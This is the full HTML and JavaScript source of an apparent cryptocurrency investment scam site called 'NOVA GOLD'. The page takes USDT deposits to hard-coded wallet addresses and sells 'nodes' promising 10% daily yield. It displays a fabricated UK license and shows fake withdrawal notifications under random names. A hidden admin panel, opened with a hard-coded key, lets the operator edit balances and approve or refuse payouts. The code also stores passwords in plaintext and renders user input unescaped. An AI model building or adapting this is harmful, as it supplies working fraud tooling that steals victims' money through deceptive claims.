<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA GOLD | Ultimate Enterprise Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0f172a; --accent: #4ade80; }
        body { background: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; touch-action: manipulation; }
        .nova-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.02); }
        .dark-card { background: var(--dark); color: white; border-radius: 28px; position: relative; overflow: hidden; border-bottom: 8px solid var(--gold); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 16px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
        .btn-gold:active { transform: scale(0.96); }
        .screen { display: none; animation: slideUp 0.4s ease-out; padding-bottom: 120px; }
        .active-screen { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
        .nav-item.active { color: var(--gold); }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 16px; border-radius: 14px; outline: none; margin-bottom: 12px; font-weight: 600; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 2000; padding: 25px; overflow-y: auto; }
        .admin-badge { background: #ef4444; color: white; font-size: 8px; padding: 2px 6px; border-radius: 4px; font-weight: 900; }
        #trust-toast { position: fixed; bottom: 95px; left: 15px; right: 15px; background: var(--dark); color: white; padding: 15px; border-radius: 18px; display: none; z-index: 3000; border-left: 6px solid var(--gold); }
    </style>
</head>
<body>

    <div id="trust-toast">
        <div class="flex items-center gap-4">
            <div class="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center"><i class="fa-solid fa-bolt text-green-500"></i></div>
            <div><p id="t-user" class="font-black text-[10px] uppercase text-white"></p><p id="t-msg" class="text-slate-400 text-[9px]"></p></div>
        </div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="text-center mb-10">
            <h1 id="logo-tap" class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[6px] mt-2">Quantum Cloud Ecosystem</p>
        </div>

        <div class="mb-8">
            <h2 class="text-2xl font-black tracking-tight mb-2">Welcome Partner 👋</h2>
            <p class="text-xs text-slate-500 font-semibold">Institutional hardware access with real-time liquid yields. UK Registered & Secured.</p>
        </div>

        <div class="space-y-3">
            <input type="text" id="u-id" placeholder="Partner Identifier" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <div id="adm-box" class="hidden"><input type="password" id="adm-key" placeholder="ADMIN MASTER KEY" class="p-input border-red-200 bg-red-50"></div>
            <button onclick="handleAuth()" class="w-full btn-gold py-5 shadow-xl">Authorize Access</button>
            <p onclick="toggleMode()" id="mode-text" class="text-center text-[10px] text-slate-400 font-black uppercase mt-6 cursor-pointer tracking-widest">Register New Account</p>
        </div>
        
        <div class="nova-card p-5 mt-10 bg-slate-50 border-none flex gap-4">
            <i class="fa-solid fa-shield-halved text-[#D4AF37] text-xl"></i>
            <div><h4 class="text-[10px] font-black uppercase">Enterprise Security</h4><p class="text-[9px] text-slate-400 font-bold leading-tight">All assets are protected by SHA-256 vault encryption and 1:1 liquidity backing.</p></div>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-50">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div id="user-tag" class="text-[8px] font-black bg-slate-900 text-white px-4 py-1.5 rounded-full tracking-widest uppercase">@PARTNER</div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="dark-card p-8 mb-6 text-center shadow-2xl">
                <p class="text-[9px] text-slate-400 font-black uppercase tracking-[5px] mb-3">Institutional Balance</p>
                <h1 id="b-main" class="text-6xl font-black tracking-tighter mb-10">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                    <div class="text-left"><p class="text-[8px] text-slate-400 uppercase font-bold">24H Revenue</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-slate-400 uppercase font-bold">Total Earned</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('modal-dep')" class="nova-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-circle-plus text-3xl text-[#D4AF37]"></i><span class="text-[10px] font-black">FUNDING</span></button>
                <button onclick="openModal('modal-wd')" class="nova-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-arrow-up-right-from-square text-3xl text-slate-400"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
            
            <div onclick="openModal('modal-legal')" class="nova-card p-5 mb-6 flex justify-between items-center border-l-4 border-blue-500">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center text-blue-600"><i class="fa-solid fa-file-contract"></i></div>
                    <div><h4 class="text-xs font-black uppercase tracking-tighter">Corporate License</h4><p class="text-[9px] text-slate-400 font-bold">UK Registered & Verified Operator</p></div>
                </div>
                <i class="fa-solid fa-chevron-right text-slate-300 text-sm"></i>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6"><div id="nodes-grid" class="space-y-4"></div></div>
        
        <div id="page-logs" class="screen px-4 pt-6"><h2 class="text-xl font-black mb-6">TRANSACTION LEDGER</h2><div id="logs-list" class="space-y-3"></div></div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-gauge-high text-xl"></i><span>CORE</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-receipt text-xl"></i><span>LOGS</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-xl text-red-400"></i><span>OUT</span></div>
        </nav>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-slate-50 z-[5000] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h1 class="text-2xl font-black italic">ROOT ADMIN HUB</h1><button onclick="closeAdmin()" class="bg-black text-white px-6 py-2 rounded-xl font-bold text-[10px] uppercase">Logout Admin</button></div>
        
        <div class="mb-10">
            <h3 class="text-[10px] font-black text-red-500 uppercase tracking-widest mb-4">Pending Requests <span id="req-count" class="admin-badge">0</span></h3>
            <div id="admin-req-list" class="space-y-4"></div>
        </div>

        <div class="nova-card p-6">
            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Manual Balance Injection</h3>
            <input type="text" id="adm-target" placeholder="User ID" class="p-input">
            <input type="number" id="adm-val" placeholder="Amount (USDT)" class="p-input">
            <button onclick="injectFunds()" class="w-full btn-gold py-4 bg-slate-900">Add Liquidity</button>
        </div>
    </div>

    <div id="modal-dep" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black italic">FUNDING GATEWAY</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="space-y-4 mb-8">
            <div class="nova-card p-5 border-l-4 border-blue-500 bg-blue-50/20">
                <p class="text-[9px] font-black uppercase text-blue-600 mb-2">Trust Wallet (USDT-BEP20)</p>
                <p class="text-[10px] font-mono break-all font-bold">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
                <button onclick="copy('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" class="text-[8px] font-black text-blue-600 mt-2 uppercase">Copy Address</button>
            </div>
            <div class="nova-card p-5 border-l-4 border-orange-500 bg-orange-50/20">
                <p class="text-[9px] font-black uppercase text-orange-600 mb-2">MetaMask (USDT-BEP20)</p>
                <p class="text-[10px] font-mono break-all font-bold">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                <button onclick="copy('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" class="text-[8px] font-black text-orange-600 mt-2 uppercase">Copy Address</button>
            </div>
        </div>
        <input type="number" id="in-amt" placeholder="Amount (USDT)" class="p-input">
        <input type="text" id="in-ref" placeholder="Tx Hash / ID" class="p-input">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-5">Submit for Verification</button>
    </div>

    <div id="modal-wd" class="modal">
        <div class="flex justify-between items-center mb-6"><h2 class="text-2xl font-black italic">EXTRACT ASSETS</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="grid grid-cols-3 gap-2 mb-6">
            <div onclick="selWd('Binance', this)" class="wd-opt border p-3 rounded-xl text-center text-[8px] font-black uppercase cursor-pointer">Binance</div>
            <div onclick="selWd('OKX', this)" class="wd-opt border p-3 rounded-xl text-center text-[8px] font-black uppercase cursor-pointer">OKX</div>
            <div onclick="selWd('Trust', this)" class="wd-opt border p-3 rounded-xl text-center text-[8px] font-black uppercase cursor-pointer">Trust</div>
        </div>
        <input type="number" id="out-amt" placeholder="Amount" class="p-input">
        <input type="text" id="out-addr" placeholder="Destination Address" class="p-input">
        <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-5 bg-slate-900">Broadcast Payout</button>
    </div>

    <div id="modal-legal" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">LEGAL LICENSE</h2><i onclick="closeModal('modal-legal')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="nova-card p-10 text-center border-double border-8 border-slate-50">
            <h1 class="text-3xl font-black text-slate-800">NOVA CORE</h1>
            <p class="text-[8px] font-bold uppercase tracking-[5px] text-slate-400 mb-8">UK Registered Infrastructure</p>
            <div class="space-y-4 text-left border-y py-6 font-bold text-[10px]">
                <p><span class="text-slate-400">LICENSE:</span> #UK-7729-N</p>
                <p><span class="text-slate-400">ENTITY:</span> NOVA INFRASTRUCTURE LTD</p>
            </div>
            <img src="https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=VERIFIED_BY_NOVA" class="mx-auto w-24 h-24 opacity-30 mt-6">
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let isLogin = true; let selMethod = "";

        if(user) startApp(user);

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "NOVA786") { openAdmin(); return; }
            if(!id || !pw) return alert("Required fields missing");
            const uR = doc(db, "users", id); const s = await getDoc(uR);
            if(!isLogin) {
                if(s.exists()) return alert("Username occupied");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0 });
                localStorage.setItem('nova_user', id); startApp(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); startApp(id);
            } else alert("Invalid credentials");
        };

        function startApp(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
            });
            genNodes(); loadUserLogs(); setInterval(showToast, 20000);
        }

        window.submitFin = async (type) => {
            const a = parseFloat(document.getElementById(type=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(type=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Missing info");
            await addDoc(collection(db, "logs"), { user, type, amount: a, status: 'Processing', time: Date.now(), ref: r, method: selMethod });
            alert("Broadcasted to Admin Hub!"); closeModal(type=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadUserLogs() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user)), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between"><div><p class="text-[8px] font-black text-slate-400 uppercase">${l.type}</p><p class="text-xs font-bold">$${l.amount}</p></div><span class="text-[8px] font-black uppercase px-2 py-1 rounded ${l.status=='Success'?'bg-green-50 text-green-500':'bg-yellow-50 text-yellow-600'}">${l.status}</span></div>`;
                });
            });
        }

        // --- ADMIN HUB CORE ---
        function loadAdminRequests() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Processing")), s => {
                const c = document.getElementById('admin-req-list'); c.innerHTML = "";
                document.getElementById('req-count').innerText = s.size;
                if(s.size === 0) c.innerHTML = "<p class='text-[10px] font-bold text-slate-300'>Queue empty.</p>";
                s.forEach(d => {
                    const l = d.data(); const docId = d.id;
                    c.innerHTML += `
                    <div class="nova-card p-5 border-l-4 border-red-500">
                        <div class="flex justify-between items-start mb-3">
                            <div><p class="text-[10px] font-black text-slate-400 uppercase">${l.type}</p><p class="text-sm font-black">User: @${l.user}</p></div>
                            <p class="text-sm font-black text-green-600">$${l.amount}</p>
                        </div>
                        <p class="text-[9px] font-mono bg-slate-100 p-2 rounded mb-4 break-all">${l.ref}</p>
                        <div class="flex gap-2">
                            <button onclick="approveReq('${docId}', '${l.user}', ${l.amount}, '${l.type}')" class="flex-1 bg-green-500 text-white text-[9px] font-black py-3 rounded-xl">APPROVE</button>
                            <button onclick="rejectReq('${docId}')" class="flex-1 bg-slate-200 text-slate-600 text-[9px] font-black py-3 rounded-xl">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approveReq = async (docId, target, amt, type) => {
            const uR = doc(db, "users", target); const s = await getDoc(uR);
            if(s.exists()){
                let nB = s.data().balance;
                if(type === 'Deposit') nB += amt;
                else { if(nB < amt) return alert("Low User Balance"); nB -= amt; }
                await updateDoc(uR, { balance: nB });
                await updateDoc(doc(db, "logs", docId), { status: 'Success' });
                alert("Operation Successful!");
            }
        };

        window.rejectReq = async (docId) => { await updateDoc(doc(db, "logs", docId), { status: 'Rejected' }); alert("Rejected."); };

        window.injectFunds = async () => {
            const t = document.getElementById('adm-target').value.toLowerCase().trim();
            const v = parseFloat(document.getElementById('adm-val').value);
            const uR = doc(db, "users", t); const s = await getDoc(uR);
            if(s.exists()){ await updateDoc(uR, { balance: s.data().balance + v }); alert("Injected!"); }
        };

        window.openAdmin = () => { document.getElementById('admin-panel').classList.remove('hidden'); loadAdminRequests(); };
        window.closeAdmin = () => location.reload();
        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "Register New Account" : "Back to Partner Login"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.copy = (t) => { navigator.clipboard.writeText(t); alert("Copied!"); };
        window.selWd = (m, el) => { document.querySelectorAll('.wd-opt').forEach(o=>o.style.borderColor='#e2e8f0'); el.style.borderColor='#D4AF37'; selMethod = m; };

        function genNodes() {
            const c = document.getElementById('nodes-grid'); c.innerHTML = "";
            for(let i=1; i<=30; i++) {
                const cost = i * 45; const y = (cost * 0.1).toFixed(2);
                c.innerHTML += `<div class="nova-card p-5 flex items-center justify-between"><div><h4 class="text-[10px] font-black uppercase tracking-tighter">Enterprise Unit G-${i}</h4><p class="text-green-500 font-bold text-[8px]">+$${y}/Day Yield</p></div><button onclick="buyNode(${cost},${y})" class="btn-gold px-4 py-2 text-[10px] shadow-md">$${cost}</button></div>`;
            }
        }
        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Liquidity Error");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Hardware Activated!");
        };

        function showToast() {
            const names = ["Zain", "Sara", "Ali", "Fatima", "Umer", "Khan", "Malik", "Irfan"];
            const u = names[Math.floor(Math.random()*names.length)];
            const val = (Math.random()*450 + 20).toFixed(2);
            document.getElementById('t-user').innerText = `Partner @${u}***`;
            document.getElementById('t-msg').innerText = `Extracted $${val} via Blockchain Node`;
            document.getElementById('trust-toast').style.display='block';
            setTimeout(()=> document.getElementById('trust-toast').style.display='none', 4500);
        }

        let taps = 0; document.getElementById('logo-tap').onclick = () => { taps++; if(taps >= 6) document.getElementById('adm-box').classList.remove('hidden'); };
    </script>
</body>
</html>
